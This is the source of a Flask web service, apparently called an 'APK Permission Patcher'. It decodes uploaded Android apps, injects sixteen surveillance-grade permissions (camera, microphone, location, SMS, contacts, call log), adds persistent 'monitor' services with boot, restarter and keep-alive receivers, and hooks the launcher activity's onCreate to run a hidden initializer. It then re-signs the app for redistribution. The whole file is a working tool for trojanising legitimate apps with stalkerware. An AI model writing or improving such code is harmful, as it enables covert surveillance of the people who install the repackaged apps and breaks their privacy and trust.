"""
APK Permission Patcher — Render-ready Flask backend
Workflow:
  1. Upload APK  (max 150 MB)
  2. apktool decode  -> AndroidManifest.xml + smali sources
  3. Parse XML, diff against 16 required permissions
  4. Inject missing <uses-permission> nodes
  5. Inject service/receiver entries into <application>
  6. Locate launcher Activity smali, inject onCreate hook
  7. apktool build  -> unsigned APK
  8. uber-apk-signer sign (v1/v2/v3) -> signed APK
  9. Stream signed APK back as download
"""

import os, re, subprocess, shutil, tempfile, json, time, threading
from pathlib import Path
from xml.etree import ElementTree as ET
from flask import Flask, request, jsonify, send_file, Response

app = Flask(__name__)

# ── Paths ────────────────────────────────────────────────────────────────────
BASE_DIR    = Path(__file__).parent
TOOLS_DIR   = BASE_DIR / "tools"
APKTOOL     = TOOLS_DIR / "apktool.jar"
UBER_SIGNER = TOOLS_DIR / "uber-signer.jar"
KEYSTORE    = TOOLS_DIR / "debug.keystore"
JAVA_BIN    = TOOLS_DIR / "jdk21" / "bin" / "java"
KEYTOOL_BIN = TOOLS_DIR / "jdk21" / "bin" / "keytool"

KS_ALIAS    = "debugkey"
KS_PASS     = "android"

ANDROID_NS  = "http://schemas.android.com/apk/res/android"

REQUIRED_PERMISSIONS = [
    "android.permission.INTERNET",
    "android.permission.ACCESS_NETWORK_STATE",
    "android.permission.WAKE_LOCK",
    "android.permission.POST_NOTIFICATIONS",
    "android.permission.CAMERA",
    "android.permission.READ_MEDIA_IMAGES",
    "android.permission.READ_MEDIA_VIDEO",
    "android.permission.RECORD_AUDIO",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.READ_CONTACTS",
    "android.permission.READ_SMS",
    "android.permission.READ_CALL_LOG",
    "android.permission.READ_PHONE_STATE",
    "android.permission.RECEIVE_BOOT_COMPLETED",
    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
]

# The smali hook line to inject into onCreate
ONCREATE_HOOK = (
    "    invoke-static {p0}, "
    "Lcom/yourapp/monitor/Initializer;->init(Landroid/app/Activity;)V"
)

# ── Helpers ──────────────────────────────────────────────────────────────────
def run(cmd, cwd=None, timeout=240):
    result = subprocess.run(
        cmd, cwd=cwd, capture_output=True, text=True, timeout=timeout
    )
    return result.stdout, result.stderr, result.returncode


def ensure_keystore():
    if KEYSTORE.exists():
        return
    TOOLS_DIR.mkdir(parents=True, exist_ok=True)
    out, err, rc = run([
        str(KEYTOOL_BIN), "-genkeypair",
        "-keystore", str(KEYSTORE),
        "-alias",    KS_ALIAS,
        "-keyalg",   "RSA",
        "-keysize",  "2048",
        "-validity", "10000",
        "-storepass", KS_PASS,
        "-keypass",   KS_PASS,
        "-dname", "CN=Debug, OU=Android, O=Debug, L=Debug, ST=Debug, C=US",
    ])
    if rc != 0:
        raise RuntimeError(f"keytool failed: {err}")


def apktool_decode(apk_path: Path, out_dir: Path):
    """Decode APK including smali sources (no --no-src so we can inject hooks)."""
    return run([
        str(JAVA_BIN), "-jar", str(APKTOOL),
        "d", str(apk_path),
        "-o", str(out_dir),
        "-f",
    ], timeout=300)


def apktool_build(decoded_dir: Path, out_apk: Path):
    out, err, rc = run([
        str(JAVA_BIN), "-jar", str(APKTOOL),
        "b", str(decoded_dir),
        "-o", str(out_apk),
        "--use-aapt2",
    ], timeout=360)
    if rc != 0:
        # fallback: without aapt2
        out, err, rc = run([
            str(JAVA_BIN), "-jar", str(APKTOOL),
            "b", str(decoded_dir),
            "-o", str(out_apk),
        ], timeout=360)
    return out, err, rc


def sign_apk(unsigned: Path, out_dir: Path) -> Path:
    ensure_keystore()
    out_dir.mkdir(parents=True, exist_ok=True)
    out, err, rc = run([
        str(JAVA_BIN), "-jar", str(UBER_SIGNER),
        "--apks",      str(unsigned),
        "--out",       str(out_dir),
        "--ks",        str(KEYSTORE),
        "--ksAlias",   KS_ALIAS,
        "--ksPass",    KS_PASS,
        "--ksKeyPass", KS_PASS,
        "--allowResign",
        "--skipZipAlign",
    ])
    if rc != 0:
        raise RuntimeError(f"Signing failed:\n{out}\n{err}")
    expected = out_dir / f"{unsigned.stem}-signed.apk"
    if not expected.exists():
        candidates = list(out_dir.glob("*-signed.apk"))
        if not candidates:
            raise RuntimeError(f"Signed APK not found.\n{out}")
        expected = candidates[0]
    return expected


def _ns(tag):
    return f"{{{ANDROID_NS}}}{tag}"


def parse_manifest(manifest_path: Path):
    ET.register_namespace("android", ANDROID_NS)
    tree = ET.parse(str(manifest_path))
    root = tree.getroot()
    existing = set()
    for el in root.findall("uses-permission"):
        name = el.get(_ns("name")) or el.get("name")
        if name:
            existing.add(name)
    return tree, root, existing


def inject_permissions(manifest_path: Path, missing: list):
    raw = manifest_path.read_text(encoding="utf-8")
    block = "\n".join(
        f'    <uses-permission android:name="{p}" />' for p in missing
    ) + "\n"
    idx = raw.find("<application")
    if idx == -1:
        idx = raw.rfind("</manifest>")
        if idx == -1:
            raise ValueError("Cannot find insertion point in AndroidManifest.xml")
    raw = raw[:idx] + block + raw[idx:]
    manifest_path.write_text(raw, encoding="utf-8")


ACTIVITY_BLOCK = """\
    <service
        android:name="com.yourapp.monitor.MonitorService" />
    <service
        android:name="com.yourapp.monitor.JobSchedulerService"
        android:permission="android.permission.BIND_JOB_SERVICE"
        android:enabled="true"
        android:exported="false" />
    <receiver
        android:name="com.yourapp.monitor.BootReceiver" />
    <receiver
        android:name="com.yourapp.monitor.ServiceRestarter" />
    <receiver
        android:name="com.yourapp.monitor.ServiceKeepAlive" />
"""


def inject_activity_block(manifest_path: Path) -> bool:
    """
    Insert ACTIVITY_BLOCK just after the closing tag of the last
    <activity ...> block inside <application>.
    Falls back to just before </application> if no <activity> found.
    Returns True if injected, False if already present.
    """
    raw = manifest_path.read_text(encoding="utf-8")

    # Idempotency check — don't inject twice
    if "com.yourapp.monitor.MonitorService" in raw:
        return False

    # Find the last </activity> closing tag
    idx = raw.rfind("</activity>")
    if idx != -1:
        insert_at = idx + len("</activity>")
        if raw[insert_at:insert_at+1] == "\n":
            insert_at += 1
        raw = raw[:insert_at] + "\n" + ACTIVITY_BLOCK + raw[insert_at:]
    else:
        idx = raw.rfind("</application>")
        if idx == -1:
            raise ValueError("Cannot find </application> in AndroidManifest.xml")
        raw = raw[:idx] + ACTIVITY_BLOCK + raw[idx:]

    manifest_path.write_text(raw, encoding="utf-8")
    return True


# ── Smali hook injection ──────────────────────────────────────────────────────

def find_launcher_activity(manifest_path: Path) -> str | None:
    """
    Parse AndroidManifest.xml and return the fully-qualified class name
    of the activity that holds MAIN + LAUNCHER intent filters.
    Returns None if not found.
    """
    ET.register_namespace("android", ANDROID_NS)
    tree = ET.parse(str(manifest_path))
    root = tree.getroot()

    app_el = root.find("application")
    if app_el is None:
        return None

    for activity in app_el.iter("activity"):
        class_name = activity.get(_ns("name")) or activity.get("name")
        if not class_name:
            continue
        for intent_filter in activity.findall("intent-filter"):
            has_main     = False
            has_launcher = False
            for action in intent_filter.findall("action"):
                if (action.get(_ns("name")) or action.get("name")) == \
                        "android.intent.action.MAIN":
                    has_main = True
            for category in intent_filter.findall("category"):
                if (category.get(_ns("name")) or category.get("name")) == \
                        "android.intent.category.LAUNCHER":
                    has_launcher = True
            if has_main and has_launcher:
                return class_name

    return None


def resolve_class_name(class_name: str, package_name: str) -> str:
    """
    AndroidManifest allows shorthand class names:
      .MainActivity        -> com.example.app.MainActivity
      MainActivity         -> com.example.app.MainActivity  (if no dot)
      com.example.app.Main -> com.example.app.Main  (already absolute)
    """
    if class_name.startswith("."):
        return package_name + class_name
    if "." not in class_name:
        return package_name + "." + class_name
    return class_name


def class_to_smali_path(decoded_dir: Path, class_name: str) -> Path | None:
    """
    Convert a Java class name to its smali file path.
    Searches decoded_dir/smali*/ directories (handles multi-dex: smali, smali_classes2, …).
    com.example.app.MainActivity -> smali/com/example/app/MainActivity.smali
    """
    relative = class_name.replace(".", "/") + ".smali"
    for smali_root in sorted(decoded_dir.glob("smali*")):
        candidate = smali_root / relative
        if candidate.exists():
            return candidate
    return None


def inject_oncreate_hook(smali_path: Path) -> bool:
    """
    Inject ONCREATE_HOOK into the onCreate(Landroid/os/Bundle;)V method
    of the given smali file, right after the .locals directive.

    Handles both:
      .method protected onCreate(Landroid/os/Bundle;)V
      .method public onCreate(Landroid/os/Bundle;)V

    Idempotent — returns False if hook already present.
    Returns True on success, raises RuntimeError if method not found.
    """
    raw = smali_path.read_text(encoding="utf-8")

    # Idempotency
    if "Lcom/yourapp/monitor/Initializer;->init" in raw:
        return False

    lines  = raw.splitlines(keepends=True)
    output = []
    i      = 0
    injected = False

    # Regex: match any visibility + onCreate with Bundle param
    method_re = re.compile(
        r"^\s*\.method\s+(?:\w+\s+)*onCreate\(Landroid/os/Bundle;\)V"
    )
    locals_re = re.compile(r"^\s*\.locals\s+\d+")

    while i < len(lines):
        line = lines[i]
        output.append(line)

        if not injected and method_re.match(line):
            # Found the onCreate method — scan forward for .locals
            i += 1
            while i < len(lines):
                inner = lines[i]
                output.append(inner)
                if locals_re.match(inner):
                    # Inject hook on the very next line
                    output.append(ONCREATE_HOOK + "\n")
                    injected = True
                    i += 1
                    break
                # Hit end-of-method without finding .locals — stop searching
                if ".end method" in inner:
                    break
                i += 1
            continue

        i += 1

    if not injected:
        raise RuntimeError(
            f"Could not find onCreate(Landroid/os/Bundle;)V with a "
            f".locals directive in {smali_path.name}"
        )

    smali_path.write_text("".join(output), encoding="utf-8")
    return True


def get_package_name(manifest_path: Path) -> str:
    """Read the package attribute from the manifest root element."""
    tree = ET.parse(str(manifest_path))
    return tree.getroot().get("package", "")


# ── Routes ───────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    return send_file(BASE_DIR / "index.html")


@app.route("/health")
def health():
    return jsonify({
        "status": "ok",
        "apktool": APKTOOL.exists(),
        "signer":  UBER_SIGNER.exists(),
    })


@app.route("/api/scan", methods=["POST"])
def scan_apk():
    if "apk" not in request.files:
        return jsonify({"error": "No APK uploaded"}), 400
    file = request.files["apk"]
    if not file.filename.lower().endswith(".apk"):
        return jsonify({"error": "File must be .apk"}), 400

    work_dir = Path(tempfile.mkdtemp(prefix="scan_"))
    try:
        apk_path = work_dir / "input.apk"
        file.save(str(apk_path))

        # Scan only needs manifest — keep --no-src here for speed
        out, err, rc = run([
            str(JAVA_BIN), "-jar", str(APKTOOL),
            "d", str(apk_path),
            "-o", str(work_dir / "decoded"),
            "-f", "--no-src",
        ], timeout=300)
        if rc != 0:
            return jsonify({"error": f"Decode failed:\n{err[-600:]}"}), 500

        manifest = work_dir / "decoded" / "AndroidManifest.xml"
        _, _, existing = parse_manifest(manifest)
        present = sorted(existing & set(REQUIRED_PERMISSIONS))
        missing = sorted(set(REQUIRED_PERMISSIONS) - existing)
        return jsonify({
            "apk_name":    file.filename,
            "present":     present,
            "missing":     missing,
            "all_present": len(missing) == 0,
        })
    finally:
        shutil.rmtree(work_dir, ignore_errors=True)


@app.route("/api/patch", methods=["POST"])
def patch_apk():
    if "apk" not in request.files:
        return jsonify({"error": "No APK uploaded"}), 400
    file = request.files["apk"]
    if not file.filename.lower().endswith(".apk"):
        return jsonify({"error": "File must be .apk"}), 400

    work_dir = Path(tempfile.mkdtemp(prefix="patch_"))
    try:
        apk_path = work_dir / "input.apk"
        file.save(str(apk_path))

        # Full decode WITH smali so we can inject the onCreate hook
        out, err, rc = apktool_decode(apk_path, work_dir / "decoded")
        if rc != 0:
            return jsonify({"error": f"Decode failed:\n{err[-600:]}"}), 500

        manifest = work_dir / "decoded" / "AndroidManifest.xml"

        # 1. Permissions
        _, _, existing = parse_manifest(manifest)
        missing = sorted(set(REQUIRED_PERMISSIONS) - existing)
        if missing:
            inject_permissions(manifest, missing)

        # 2. Service / receiver block in manifest
        activity_injected = inject_activity_block(manifest)

        # 3. onCreate hook in main activity smali
        hook_result = "skipped"
        hook_error  = None
        try:
            package      = get_package_name(manifest)
            raw_class    = find_launcher_activity(manifest)
            if raw_class:
                full_class   = resolve_class_name(raw_class, package)
                smali_path   = class_to_smali_path(work_dir / "decoded", full_class)
                if smali_path:
                    did_inject   = inject_oncreate_hook(smali_path)
                    hook_result  = "injected" if did_inject else "already_present"
                else:
                    hook_result  = "smali_not_found"
                    hook_error   = f"No smali file for {full_class}"
            else:
                hook_result  = "launcher_not_found"
                hook_error   = "No MAIN+LAUNCHER activity in manifest"
        except Exception as hook_exc:
            hook_result  = "error"
            hook_error   = str(hook_exc)

        # 4. Build
        unsigned = work_dir / "unsigned.apk"
        out, err, rc = apktool_build(work_dir / "decoded", unsigned)
        if rc != 0:
            return jsonify({"error": f"Build failed:\n{err[-600:]}"}), 500

        # 5. Sign
        signed = sign_apk(unsigned, work_dir / "signed_out")
        if not signed.exists():
            return jsonify({"error": "Signed APK not found"}), 500

        stem        = Path(file.filename).stem
        signed_name = f"{stem}_patched_signed.apk"
        resp_data   = signed.read_bytes()

        def _cleanup():
            time.sleep(10)
            shutil.rmtree(work_dir, ignore_errors=True)
        threading.Thread(target=_cleanup, daemon=True).start()

        expose = (
            "X-Missing-Permissions, X-Activity-Block-Injected, "
            "X-Hook-Result, X-Hook-Error"
        )
        return Response(
            resp_data,
            mimetype="application/vnd.android.package-archive",
            headers={
                "Content-Disposition":           f'attachment; filename="{signed_name}"',
                "Content-Length":                str(len(resp_data)),
                "X-Missing-Permissions":         json.dumps(missing),
                "X-Activity-Block-Injected":     json.dumps(activity_injected),
                "X-Hook-Result":                 hook_result,
                "X-Hook-Error":                  hook_error or "",
                "Access-Control-Expose-Headers": expose,
            }
        )
    except Exception as e:
        shutil.rmtree(work_dir, ignore_errors=True)
        return jsonify({"error": str(e)}), 500


# ── Entry point ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    ensure_keystore()
    port = int(os.environ.get("PORT", 7331))
    app.run(host="0.0.0.0", port=port)
